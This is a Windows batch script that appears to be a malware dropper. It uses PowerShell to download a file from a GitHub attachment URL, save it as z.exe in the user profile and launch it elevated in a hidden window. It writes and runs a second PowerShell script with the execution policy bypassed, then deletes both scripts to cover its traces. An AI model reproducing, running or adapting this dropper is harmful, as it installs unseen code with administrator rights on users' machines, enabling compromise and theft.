@echo off
echo $Url = 'https://github.com/user-attachments/files/15895328/z.zip'
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $ProgressPreference = 'SilentlyContinue'; $OutFile = Join-Path -Path $env:USERPROFILE -ChildPath 'z.exe'; Invoke-WebRequest -Uri $Url -OutFile $OutFile; $InstallerPath = $OutFile; $Arguments = '-fullinstall'; $Command = 'Start-Process -FilePath $InstallerPath -ArgumentList $Arguments -Verb RunAs -WindowStyle Hidden'; Invoke-Expression -Command $Command"
powershell -Command "Add-Content -Path ok.ps1 -Value 'echo $Url = ''https://github.com/user-attachments/files/15895328/z.zip''; [Net.ServicePointManager]::SecurityProtocol = ''tls12, tls11, tls''; $ProgressPreference = ''SilentlyContinue''; $OutFile = Join-Path -Path $env:USERPROFILE -ChildPath ''z.exe''; Invoke-WebRequest -Uri $Url -OutFile $OutFile; $InstallerPath = $OutFile; $Arguments = ''-fullinstall''; $Command = ''Start-Process -FilePath ''$InstallerPath'' -ArgumentList ''$Arguments'' -Verb RunAs -WindowStyle Hidden''; Invoke-Expression -Command $Command'"
powershell.exe -ExecutionPolicy Bypass -File ok.ps1
del %0
del ok.ps1
